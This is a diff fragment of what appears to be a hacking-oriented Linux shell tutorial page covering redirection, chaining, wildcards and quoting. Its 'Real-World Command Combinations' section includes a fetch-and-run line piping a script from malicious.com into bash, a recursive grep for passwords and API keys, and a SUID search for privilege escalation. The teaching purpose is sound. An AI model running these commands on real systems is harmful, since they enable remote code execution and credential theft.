+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #00ff88; font-size: 1.3rem;">2&gt;/dev/null</code> = <strong>Hide all errors</strong> (send to void)</p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>find / -name "*.txt" 2>/dev/null</code> → no "Permission denied" spam</p>
+                                </div>
+                            </div>
+
+                            <div style="background: rgba(255,193,7,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #ffc107;">
+                                <h4 style="color: #ffc107; font-size: 1.6rem; margin: 0 0 1.5rem 0;">Command Chaining:</h4>
+                                <div style="font-size: 1.15rem; line-height: 2.2;">
+                                    <p style="margin: 0.8rem 0;"><code style="color: #ffc107; font-size: 1.3rem;">;</code> (semicolon) = <strong>Run commands sequentially</strong> (always runs both)</p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>cd /tmp ; ls</code> → change directory, then list files</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #ffc107; font-size: 1.3rem;">&amp;&amp;</code> (AND) = <strong>Run second IF first succeeds</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>mkdir test && cd test</code> → only cd if mkdir worked</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #ffc107; font-size: 1.3rem;">||</code> (OR) = <strong>Run second IF first fails</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>ping google.com || echo "No internet"</code> → show message if ping fails</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #ffc107; font-size: 1.3rem;">&amp;</code> (background) = <strong>Run in background</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>python3 server.py &</code> → starts server in background</p>
+                                </div>
+                            </div>
+
+                            <div style="background: rgba(156,39,176,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #9c27b0;">
+                                <h4 style="color: #9c27b0; font-size: 1.6rem; margin: 0 0 1.5rem 0;">Wildcards & Patterns:</h4>
+                                <div style="font-size: 1.15rem; line-height: 2.2;">
+                                    <p style="margin: 0.8rem 0;"><code style="color: #c7f; font-size: 1.3rem;">*</code> (asterisk) = <strong>Match anything (zero or more characters)</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>ls *.txt</code> → lists all .txt files</p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>rm file*</code> → deletes file1, file2, file_old, etc.</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #c7f; font-size: 1.3rem;">?</code> (question mark) = <strong>Match exactly ONE character</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>ls file?.txt</code> → matches file1.txt, fileA.txt, but NOT file10.txt</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #c7f; font-size: 1.3rem;">[abc]</code> = <strong>Match one character from set</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>ls file[123].txt</code> → matches file1.txt, file2.txt, file3.txt</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #c7f; font-size: 1.3rem;">{a,b}</code> = <strong>Match one of multiple patterns</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>mv file.{txt,log}</code> → renames file.txt to file.log</p>
+                                </div>
+                            </div>
+
+                            <div style="background: rgba(255,64,129,0.1); padding: 2rem; border-radius: 10px; border-left: 4px solid #ff4081;">
+                                <h4 style="color: #ff4081; font-size: 1.6rem; margin: 0 0 1.5rem 0;">Quotes & Escaping:</h4>
+                                <div style="font-size: 1.15rem; line-height: 2.2;">
+                                    <p style="margin: 0.8rem 0;"><code style="color: #ff4081; font-size: 1.3rem;">"text"</code> (double quotes) = <strong>Treat as string but allow variables</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>echo "Hello $USER"</code> → expands $USER variable</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #ff4081; font-size: 1.3rem;">'text'</code> (single quotes) = <strong>Treat as LITERAL string</strong> (no expansion)</p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>echo 'Hello $USER'</code> → prints literally "Hello $USER"</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #ff4081; font-size: 1.3rem;">\</code> (backslash) = <strong>Escape special character</strong></p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>echo \$5</code> → prints "$5" instead of expanding variable</p>
+                                    
+                                    <p style="margin: 1.5rem 0 0.8rem;"><code style="color: #ff4081; font-size: 1.3rem;">`cmd`</code> or <code>$(cmd)</code> = <strong>Command substitution</strong> (run command, use output)</p>
+                                    <p style="margin-left: 2rem; color: #aaa;">Example: <code>echo "Today is $(date)"</code> → runs date command, inserts result</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Real-World Examples -->
+                        <div style="background: linear-gradient(135deg, rgba(76,175,80,0.15) 0%, rgba(139,195,74,0.15) 100%); padding: 3rem; border-radius: 15px; margin: 3rem 0; border: 2px solid #4caf50;">
+                            <h4 style="color: #4caf50; font-size: 2rem; margin: 0 0 2rem 0; text-align: center;">🎯 Real-World Command Combinations</h4>
+                            
+                            <div style="display: grid; gap: 2rem;">
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #00ff88; font-size: 1.4rem; margin: 0 0 1rem 0;">Find all SUID binaries (privilege escalation):</h5>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; font-family: monospace;">
+                                        <p style="color: #0f0; margin: 0;">find / -perm -4000 -type f 2>/dev/null</p>
+                                    </div>
+                                    <p style="margin: 1rem 0 0; font-size: 1.1rem; line-height: 1.8;">
+                                        <strong>Breakdown:</strong> <code>find /</code> (search from root) → <code>-perm -4000</code> (SUID permission) → <code>-type f</code> (files only) → <code>2>/dev/null</code> (hide errors)
+                                    </p>
+                                </div>
+
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #00ff88; font-size: 1.4rem; margin: 0 0 1rem 0;">Extract unique IPs from log file:</h5>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; font-family: monospace;">
+                                        <p style="color: #0f0; margin: 0;">cat access.log | grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort | uniq -c | sort -nr</p>
+                                    </div>
+                                    <p style="margin: 1rem 0 0; font-size: 1.1rem; line-height: 1.8;">
+                                        <strong>Breakdown:</strong> <code>cat</code> (read file) → <code>grep -oE</code> (extract IPs with regex) → <code>sort</code> (alphabetize) → <code>uniq -c</code> (count duplicates) → <code>sort -nr</code> (sort by count, highest first)
+                                    </p>
+                                </div>
+
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #00ff88; font-size: 1.4rem; margin: 0 0 1rem 0;">Download file and run immediately:</h5>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; font-family: monospace;">
+                                        <p style="color: #0f0; margin: 0;">curl -s http://malicious.com/shell.sh | bash</p>
+                                    </div>
+                                    <p style="margin: 1rem 0 0; font-size: 1.1rem; line-height: 1.8;">
+                                        <strong>Breakdown:</strong> <code>curl -s</code> (download silently) → <code>|</code> (pipe to bash) → <code>bash</code> (execute immediately) <span style="color: #ff5f57;"><strong>⚠️ DANGEROUS!</strong></span>
+                                    </p>
+                                </div>
+
+                                <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px;">
+                                    <h5 style="color: #00ff88; font-size: 1.4rem; margin: 0 0 1rem 0;">Recursive grep for passwords in all files:</h5>
+                                    <div style="background: #000; padding: 1.5rem; border-radius: 8px; font-family: monospace;">
+                                        <p style="color: #0f0; margin: 0;">grep -r -i -E "password|pass|pwd|api_key|secret" /var/www/ 2>/dev/null | tee found.txt</p>
+                                    </div>
+                                    <p style="margin: 1rem 0 0; font-size: 1.1rem; line-height: 1.8;">
+                                        <strong>Breakdown:</strong> <code>grep -r</code> (recursive) → <code>-i</code> (case-insensitive) → <code>-E</code> (regex) → <code>pattern</code> (search terms) → <code>2>/dev/null</code> (hide errors) → <code>tee</code> (show AND save)
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
                 <!-- Topic 1: Advanced File Operations -->
                 <div class="topic-section" style="background: linear-gradient(135deg, rgba(0,255,136,0.05) 0%, rgba(0,204,255,0.05) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0;">
                     <h2 style="color: #00ff88; font-size: 2.2rem; margin-bottom: 2rem;">1. Advanced File Operations: Search & Destroy</h2>
